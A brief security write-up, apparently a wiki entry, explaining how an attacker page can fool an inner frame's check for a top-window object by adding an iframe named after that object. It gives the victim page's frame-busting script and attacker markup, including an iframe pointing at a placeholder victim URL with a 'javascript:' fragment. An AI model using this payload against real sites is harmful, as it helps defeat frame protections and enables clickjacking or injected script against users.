# Introduction
In some cases inner frames scripts will check for the existence of top frames objects. It is possible to fool the script by thinking the top window and the object is looking for is accessible by adding iframe elements with the name of the object itself.

## Details

http://vi.ct.im/page
```
 <script>
 if(top.globalObject!='someValue'){
   top.location=location.href.split('#')[0];
 }
</script>
```

top window
```
<iframe name='globalObject'></iframe>
<iframe src='http://vi.ct.im/page#javascript:JsHere'></iframe>
```
